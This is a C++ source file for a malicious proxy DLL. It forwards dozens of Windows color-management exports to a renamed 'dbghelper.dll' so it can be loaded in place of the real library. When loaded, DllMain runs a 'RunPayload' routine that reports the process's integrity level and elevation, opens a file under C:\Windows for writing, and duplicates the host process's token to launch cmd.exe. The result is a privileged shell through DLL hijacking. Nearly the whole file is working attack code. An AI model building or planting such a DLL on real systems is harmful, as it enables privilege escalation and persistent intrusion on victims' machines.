// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <windows.h>
#include <Wtsapi32.h>
#include <sstream>
#include <memory>

//extern "C" __declspec()
#pragma comment(lib, "Wtsapi32.lib")

//exports goes here
#pragma comment(linker, "/export:AssociateColorProfileWithDeviceA=dbghelper.dll.AssociateColorProfileWithDeviceA")
#pragma comment(linker, "/export:AssociateColorProfileWithDeviceW=dbghelper.dll.AssociateColorProfileWithDeviceW")
#pragma comment(linker, "/export:CheckBitmapBits=dbghelper.dll.CheckBitmapBits")
#pragma comment(linker, "/export:CheckColors=dbghelper.dll.CheckColors")
#pragma comment(linker, "/export:CloseColorProfile=dbghelper.dll.CloseColorProfile")
#pragma comment(linker, "/export:CloseDisplay=dbghelper.dll.CloseDisplay")
#pragma comment(linker, "/export:ColorCplGetDefaultProfileScope=dbghelper.dll.ColorCplGetDefaultProfileScope")
#pragma comment(linker, "/export:ColorCplGetDefaultRenderingIntentScope=dbghelper.dll.ColorCplGetDefaultRenderingIntentScope")
#pragma comment(linker, "/export:ColorCplGetProfileProperties=dbghelper.dll.ColorCplGetProfileProperties")
#pragma comment(linker, "/export:ColorCplHasSystemWideAssociationListChanged=dbghelper.dll.ColorCplHasSystemWideAssociationListChanged")
#pragma comment(linker, "/export:ColorCplInitialize=dbghelper.dll.ColorCplInitialize")
#pragma comment(linker, "/export:ColorCplLoadAssociationList=dbghelper.dll.ColorCplLoadAssociationList")
#pragma comment(linker, "/export:ColorCplMergeAssociationLists=dbghelper.dll.ColorCplMergeAssociationLists")
#pragma comment(linker, "/export:ColorCplOverwritePerUserAssociationList=dbghelper.dll.ColorCplOverwritePerUserAssociationList")
#pragma comment(linker, "/export:ColorCplReleaseProfileProperties=dbghelper.dll.ColorCplReleaseProfileProperties")
#pragma comment(linker, "/export:ColorCplResetSystemWideAssociationListChangedWarning=dbghelper.dll.ColorCplResetSystemWideAssociationListChangedWarning")
#pragma comment(linker, "/export:ColorCplSaveAssociationList=dbghelper.dll.ColorCplSaveAssociationList")
#pragma comment(linker, "/export:ColorCplSetUsePerUserProfiles=dbghelper.dll.ColorCplSetUsePerUserProfiles")
#pragma comment(linker, "/export:ColorCplUninitialize=dbghelper.dll.ColorCplUninitialize")
#pragma comment(linker, "/export:ConvertColorNameToIndex=dbghelper.dll.ConvertColorNameToIndex")
#pragma comment(linker, "/export:ConvertIndexToColorName=dbghelper.dll.ConvertIndexToColorName")
#pragma comment(linker, "/export:CreateColorTransformA=dbghelper.dll.CreateColorTransformA")
#pragma comment(linker, "/export:CreateColorTransformW=dbghelper.dll.CreateColorTransformW")
#pragma comment(linker, "/export:CreateDeviceLinkProfile=dbghelper.dll.CreateDeviceLinkProfile")
#pragma comment(linker, "/export:CreateMultiProfileTransform=dbghelper.dll.CreateMultiProfileTransform")
#pragma comment(linker, "/export:CreateProfileFromLogColorSpaceA=dbghelper.dll.CreateProfileFromLogColorSpaceA")
#pragma comment(linker, "/export:CreateProfileFromLogColorSpaceW=dbghelper.dll.CreateProfileFromLogColorSpaceW")
#pragma comment(linker, "/export:DccwCreateDisplayProfileAssociationList=dbghelper.dll.DccwCreateDisplayProfileAssociationList")
#pragma comment(linker, "/export:DccwGetDisplayProfileAssociationList=dbghelper.dll.DccwGetDisplayProfileAssociationList")
#pragma comment(linker, "/export:DccwGetGamutSize=dbghelper.dll.DccwGetGamutSize")
#pragma comment(linker, "/export:DccwReleaseDisplayProfileAssociationList=dbghelper.dll.DccwReleaseDisplayProfileAssociationList")
#pragma comment(linker, "/export:DccwSetDisplayProfileAssociationList=dbghelper.dll.DccwSetDisplayProfileAssociationList")
#pragma comment(linker, "/export:DeleteColorTransform=dbghelper.dll.DeleteColorTransform")
#pragma comment(linker, "/export:DeviceRenameEvent=dbghelper.dll.DeviceRenameEvent")
#pragma comment(linker, "/export:DisassociateColorProfileFromDeviceA=dbghelper.dll.DisassociateColorProfileFromDeviceA")
#pragma comment(linker, "/export:DisassociateColorProfileFromDeviceW=dbghelper.dll.DisassociateColorProfileFromDeviceW")
#pragma comment(linker, "/export:DllCanUnloadNow=dbghelper.dll.DllCanUnloadNow")
#pragma comment(linker, "/export:DllGetClassObject=dbghelper.dll.DllGetClassObject")
#pragma comment(linker, "/export:EnumColorProfilesA=dbghelper.dll.EnumColorProfilesA")
#pragma comment(linker, "/export:EnumColorProfilesW=dbghelper.dll.EnumColorProfilesW")
#pragma comment(linker, "/export:GenerateCopyFilePaths=dbghelper.dll.GenerateCopyFilePaths")
#pragma comment(linker, "/export:GetCMMInfo=dbghelper.dll.GetCMMInfo")
#pragma comment(linker, "/export:GetColorDirectoryA=dbghelper.dll.GetColorDirectoryA")
#pragma comment(linker, "/export:GetColorDirectoryW=dbghelper.dll.GetColorDirectoryW")
#pragma comment(linker, "/export:GetColorProfileElement=dbghelper.dll.GetColorProfileElement")
#pragma comment(linker, "/export:GetColorProfileElementTag=dbghelper.dll.GetColorProfileElementTag")
#pragma comment(linker, "/export:GetColorProfileFromHandle=dbghelper.dll.GetColorProfileFromHandle")
#pragma comment(linker, "/export:GetColorProfileHeader=dbghelper.dll.GetColorProfileHeader")
#pragma comment(linker, "/export:GetCountColorProfileElements=dbghelper.dll.GetCountColorProfileElements")
#pragma comment(linker, "/export:GetNamedProfileInfo=dbghelper.dll.GetNamedProfileInfo")
#pragma comment(linker, "/export:GetPS2ColorRenderingDictionary=dbghelper.dll.GetPS2ColorRenderingDictionary")
#pragma comment(linker, "/export:GetPS2ColorRenderingIntent=dbghelper.dll.GetPS2ColorRenderingIntent")
#pragma comment(linker, "/export:GetPS2ColorSpaceArray=dbghelper.dll.GetPS2ColorSpaceArray")
#pragma comment(linker, "/export:GetStandardColorSpaceProfileA=dbghelper.dll.GetStandardColorSpaceProfileA")
#pragma comment(linker, "/export:GetStandardColorSpaceProfileW=dbghelper.dll.GetStandardColorSpaceProfileW")
#pragma comment(linker, "/export:InstallColorProfileA=dbghelper.dll.InstallColorProfileA")
#pragma comment(linker, "/export:InstallColorProfileW=dbghelper.dll.InstallColorProfileW")
#pragma comment(linker, "/export:InternalGetDeviceConfig=dbghelper.dll.InternalGetDeviceConfig")
#pragma comment(linker, "/export:InternalGetPS2CSAFromLCS=dbghelper.dll.InternalGetPS2CSAFromLCS")
#pragma comment(linker, "/export:InternalGetPS2ColorRenderingDictionary=dbghelper.dll.InternalGetPS2ColorRenderingDictionary")
#pragma comment(linker, "/export:InternalGetPS2ColorSpaceArray=dbghelper.dll.InternalGetPS2ColorSpaceArray")
#pragma comment(linker, "/export:InternalGetPS2PreviewCRD=dbghelper.dll.InternalGetPS2PreviewCRD")
#pragma comment(linker, "/export:InternalRefreshCalibration=dbghelper.dll.InternalRefreshCalibration")
#pragma comment(linker, "/export:InternalSetDeviceConfig=dbghelper.dll.InternalSetDeviceConfig")
#pragma comment(linker, "/export:InternalWcsAssociateColorProfileWithDevice=dbghelper.dll.InternalWcsAssociateColorProfileWithDevice")
#pragma comment(linker, "/export:InternalWcsDisassociateColorProfileWithDevice=dbghelper.dll.InternalWcsDisassociateColorProfileWithDevice")
#pragma comment(linker, "/export:IsColorProfileTagPresent=dbghelper.dll.IsColorProfileTagPresent")
#pragma comment(linker, "/export:IsColorProfileValid=dbghelper.dll.IsColorProfileValid")
#pragma comment(linker, "/export:OpenColorProfileA=dbghelper.dll.OpenColorProfileA")
#pragma comment(linker, "/export:OpenColorProfileW=dbghelper.dll.OpenColorProfileW")
#pragma comment(linker, "/export:OpenDisplay=dbghelper.dll.OpenDisplay")
#pragma comment(linker, "/export:RegisterCMMA=dbghelper.dll.RegisterCMMA")
#pragma comment(linker, "/export:RegisterCMMW=dbghelper.dll.RegisterCMMW")
#pragma comment(linker, "/export:SelectCMM=dbghelper.dll.SelectCMM")
#pragma comment(linker, "/export:SetColorProfileElement=dbghelper.dll.SetColorProfileElement")
#pragma comment(linker, "/export:SetColorProfileElementReference=dbghelper.dll.SetColorProfileElementReference")
#pragma comment(linker, "/export:SetColorProfileElementSize=dbghelper.dll.SetColorProfileElementSize")
#pragma comment(linker, "/export:SetColorProfileHeader=dbghelper.dll.SetColorProfileHeader")
#pragma comment(linker, "/export:SetStandardColorSpaceProfileA=dbghelper.dll.SetStandardColorSpaceProfileA")
#pragma comment(linker, "/export:SetStandardColorSpaceProfileW=dbghelper.dll.SetStandardColorSpaceProfileW")
#pragma comment(linker, "/export:SpoolerCopyFileEvent=dbghelper.dll.SpoolerCopyFileEvent")
#pragma comment(linker, "/export:TranslateBitmapBits=dbghelper.dll.TranslateBitmapBits")
#pragma comment(linker, "/export:TranslateColors=dbghelper.dll.TranslateColors")
#pragma comment(linker, "/export:UninstallColorProfileA=dbghelper.dll.UninstallColorProfileA")
#pragma comment(linker, "/export:UninstallColorProfileW=dbghelper.dll.UninstallColorProfileW")
#pragma comment(linker, "/export:UnregisterCMMA=dbghelper.dll.UnregisterCMMA")
#pragma comment(linker, "/export:UnregisterCMMW=dbghelper.dll.UnregisterCMMW")
#pragma comment(linker, "/export:WcsAssociateColorProfileWithDevice=dbghelper.dll.WcsAssociateColorProfileWithDevice")
#pragma comment(linker, "/export:WcsCheckColors=dbghelper.dll.WcsCheckColors")
#pragma comment(linker, "/export:WcsCreateIccProfile=dbghelper.dll.WcsCreateIccProfile")
#pragma comment(linker, "/export:WcsDisassociateColorProfileFromDevice=dbghelper.dll.WcsDisassociateColorProfileFromDevice")
#pragma comment(linker, "/export:WcsEnumColorProfiles=dbghelper.dll.WcsEnumColorProfiles")
#pragma comment(linker, "/export:WcsEnumColorProfilesSize=dbghelper.dll.WcsEnumColorProfilesSize")
#pragma comment(linker, "/export:WcsGetCalibrationManagementState=dbghelper.dll.WcsGetCalibrationManagementState")
#pragma comment(linker, "/export:WcsGetDefaultColorProfile=dbghelper.dll.WcsGetDefaultColorProfile")
#pragma comment(linker, "/export:WcsGetDefaultColorProfileSize=dbghelper.dll.WcsGetDefaultColorProfileSize")
#pragma comment(linker, "/export:WcsGetDefaultRenderingIntent=dbghelper.dll.WcsGetDefaultRenderingIntent")
#pragma comment(linker, "/export:WcsGetUsePerUserProfiles=dbghelper.dll.WcsGetUsePerUserProfiles")
#pragma comment(linker, "/export:WcsGpCanInstallOrUninstallProfiles=dbghelper.dll.WcsGpCanInstallOrUninstallProfiles")
#pragma comment(linker, "/export:WcsOpenColorProfileA=dbghelper.dll.WcsOpenColorProfileA")
#pragma comment(linker, "/export:WcsOpenColorProfileW=dbghelper.dll.WcsOpenColorProfileW")
#pragma comment(linker, "/export:WcsSetCalibrationManagementState=dbghelper.dll.WcsSetCalibrationManagementState")
#pragma comment(linker, "/export:WcsSetDefaultColorProfile=dbghelper.dll.WcsSetDefaultColorProfile")
#pragma comment(linker, "/export:WcsSetDefaultRenderingIntent=dbghelper.dll.WcsSetDefaultRenderingIntent")
#pragma comment(linker, "/export:WcsSetUsePerUserProfiles=dbghelper.dll.WcsSetUsePerUserProfiles")
#pragma comment(linker, "/export:WcsTranslateColors=dbghelper.dll.WcsTranslateColors")
#pragma comment(linker, "/export:InternalGetPS2ColorRenderingDictionary2=dbghelper.dll.InternalGetPS2ColorRenderingDictionary2")
#pragma comment(linker, "/export:InternalGetPS2PreviewCRD2=dbghelper.dll.InternalGetPS2PreviewCRD2")
#pragma comment(linker, "/export:InternalGetPS2ColorSpaceArray2=dbghelper.dll.InternalGetPS2ColorSpaceArray2")
#pragma comment(linker, "/export:InternalSetDeviceGammaRamp=dbghelper.dll.InternalSetDeviceGammaRamp")
#pragma comment(linker, "/export:InternalSetDeviceTemperature=dbghelper.dll.InternalSetDeviceTemperature")
#pragma comment(linker, "/export:InternalGetAppliedGammaRamp=dbghelper.dll.InternalGetAppliedGammaRamp")
#pragma comment(linker, "/export:InternalGetDeviceGammaCapability=dbghelper.dll.InternalGetDeviceGammaCapability")
#pragma comment(linker, "/export:ColorAdapterGetSystemModifyWhitePointCaps=dbghelper.dll.ColorAdapterGetSystemModifyWhitePointCaps")
#pragma comment(linker, "/export:ColorAdapterGetDisplayCurrentStateID=dbghelper.dll.ColorAdapterGetDisplayCurrentStateID")
#pragma comment(linker, "/export:ColorAdapterUpdateDisplayGamma=dbghelper.dll.ColorAdapterUpdateDisplayGamma")
#pragma comment(linker, "/export:ColorAdapterUpdateDeviceProfile=dbghelper.dll.ColorAdapterUpdateDeviceProfile")
#pragma comment(linker, "/export:ColorAdapterGetDisplayTransformData=dbghelper.dll.ColorAdapterGetDisplayTransformData")
#pragma comment(linker, "/export:ColorAdapterGetDisplayTargetWhitePoint=dbghelper.dll.ColorAdapterGetDisplayTargetWhitePoint")
#pragma comment(linker, "/export:ColorAdapterGetDisplayProfile=dbghelper.dll.ColorAdapterGetDisplayProfile")
#pragma comment(linker, "/export:ColorAdapterGetCurrentProfileCalibration=dbghelper.dll.ColorAdapterGetCurrentProfileCalibration")
#pragma comment(linker, "/export:ColorAdapterRegisterOEMColorService=dbghelper.dll.ColorAdapterRegisterOEMColorService")
#pragma comment(linker, "/export:ColorAdapterUnregisterOEMColorService=dbghelper.dll.ColorAdapterUnregisterOEMColorService")
#pragma comment(linker, "/export:ColorProfileAddDisplayAssociation=dbghelper.dll.ColorProfileAddDisplayAssociation")
#pragma comment(linker, "/export:ColorProfileRemoveDisplayAssociation=dbghelper.dll.ColorProfileRemoveDisplayAssociation")
#pragma comment(linker, "/export:ColorProfileSetDisplayDefaultAssociation=dbghelper.dll.ColorProfileSetDisplayDefaultAssociation")
#pragma comment(linker, "/export:ColorProfileGetDisplayList=dbghelper.dll.ColorProfileGetDisplayList")
#pragma comment(linker, "/export:ColorProfileGetDisplayDefault=dbghelper.dll.ColorProfileGetDisplayDefault")
#pragma comment(linker, "/export:ColorProfileGetDisplayUserScope=dbghelper.dll.ColorProfileGetDisplayUserScope")

//extern "C" __declspec(dllexport) void __cdecl DccwReleaseDisplayProfileAssociationList(void) { return; };
//extern "C" __declspec(dllexport) void __cdecl WcsGetCalibrationManagementState(void) { return; };
//extern "C" __declspec(dllexport) void __cdecl WcsSetCalibrationManagementState(void) { return; };



void
se_impersonate_priv(HANDLE elevated_token)
{

    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    SECURITY_DESCRIPTOR sdSecurityDescriptor;
    HANDLE duped_token;
    BOOL result;
    SECURITY_ATTRIBUTES sa = { 0 };

    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFO);

    // create impersonation token
    result = DuplicateTokenEx(elevated_token,
        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_IMPERSONATE,
        NULL,
        SecurityDelegation,
        TokenImpersonation,
        &duped_token);

    if (!result) {
        printf("[-] DuplicateTokenEx failed: %d\n", GetLastError());
        return;
    }
    LPWSTR a = (LPWSTR)"C:\\Windows\\System32\\cmd.exe";
    result = CreateProcessWithTokenW(duped_token,
        0,
        L"C:\\Windows\\System32\\cmd.exe",
        a,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);

    if (!result) {
        printf("[-] Failed to create proc: %d\n", GetLastError());
        return;
    }
}


DWORD GetFirstActiveSession()
{
    PWTS_SESSION_INFO sessions;
    DWORD count;

    if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessions, &count))
    {
        for (DWORD i = 0; i < count; ++i)
        {
            if (sessions[i].State == WTSActive)
            {
                return sessions[i].SessionId;
            }
        }
    }

    return 0xFFFFFFFF;
}

void StartProcess()
{
    STARTUPINFO startInfo = { 0 };
    PROCESS_INFORMATION procInfo = { 0 };

    startInfo.cb = sizeof(startInfo);

    HANDLE hToken;
    DWORD sessionId = GetFirstActiveSession();
    if (sessionId == 0xFFFFFFFF)
    {
        sessionId = WTSGetActiveConsoleSessionId();
    }

    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, &hToken);
    se_impersonate_priv(hToken);
    if (sessionId != 0xFFFFFFFF)
    {
        SetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(sessionId));
    }

    startInfo.wShowWindow = SW_SHOW;
    //startInfo.lpDesktop = L"WinSta0\\Default";
    startInfo.lpDesktop = const_cast<LPWSTR>(TEXT("WinSta0\\Default"));

    WCHAR cmdline[] = L"cmd.exe";

    //CreateProcessAsUser(hToken, nullptr, cmdline, nullptr, nullptr, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
        //nullptr, nullptr, &startInfo, &procInfo);

}

bool QueryTokenBool(HANDLE token, TOKEN_INFORMATION_CLASS token_info)
{
    DWORD value;
    DWORD ret_length;

    if (GetTokenInformation(token, token_info, &value, sizeof(value), &ret_length))
    {
        return value != 0;
    }
    return false;
}

std::wstring QueryTokenIL(HANDLE token)
{
    std::size_t size = sizeof(TOKEN_MANDATORY_LABEL) + SECURITY_MAX_SID_SIZE;
    std::unique_ptr<BYTE> buffer = std::unique_ptr<BYTE>(new BYTE[size]);
    DWORD ret_length;
    if (GetTokenInformation(token, TokenIntegrityLevel, buffer.get(), static_cast<DWORD>(size), &ret_length))
    {
        PTOKEN_MANDATORY_LABEL label = reinterpret_cast<PTOKEN_MANDATORY_LABEL>(buffer.get());
        DWORD il = *GetSidSubAuthority(label->Label.Sid, 0);
        switch (il)
        {
        case SECURITY_MANDATORY_SYSTEM_RID:
            return L"System";
        case SECURITY_MANDATORY_HIGH_RID:
            return L"High";
        case SECURITY_MANDATORY_MEDIUM_RID:
            return L"Medium";
        case SECURITY_MANDATORY_LOW_RID:
            return L"Low";
        case SECURITY_MANDATORY_UNTRUSTED_RID:
            return L"Untrusted";
        default:
            std::wstringstream ss;
            ss << L"0x" << std::hex << il;
            return ss.str();
        }
    }
    return L"Medium";
}

void DoProcessAttach()
{
    HANDLE token;
    bool ui_access = false;
    bool elevated = false;
    std::wstring il = L"Medium";
    std::wstringstream ss;
    std::wstring targetfwDos;
    targetfwDos = L"C:\\Windows\\myware.exe";
    HANDLE h = CreateFile(targetfwDos.c_str(),
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, //0, // 
        0,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        0);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
    {
        ui_access = QueryTokenBool(token, TokenUIAccess);
        elevated = QueryTokenBool(token, TokenElevation);
        il = QueryTokenIL(token);
        CloseHandle(token);
    }

    ss << L"Hello From Process " << GetCurrentProcessId() << std::endl
        << "Integrity: " << il << std::endl
        << "UIAccess: " << std::boolalpha << ui_access << std::endl
        << "Elevated: " << elevated;
    MessageBox(nullptr, ss.str().c_str(), L"Hello", MB_OK | MB_ICONINFORMATION);
    StartProcess();
}



void RunPayload()
{
    std::wstringstream ss;
    DoProcessAttach();
    //ss << L"Hello From Dll ";
    //MessageBox(nullptr, ss.str().c_str(), L"Hello", MB_OK | MB_ICONINFORMATION);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        RunPayload();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
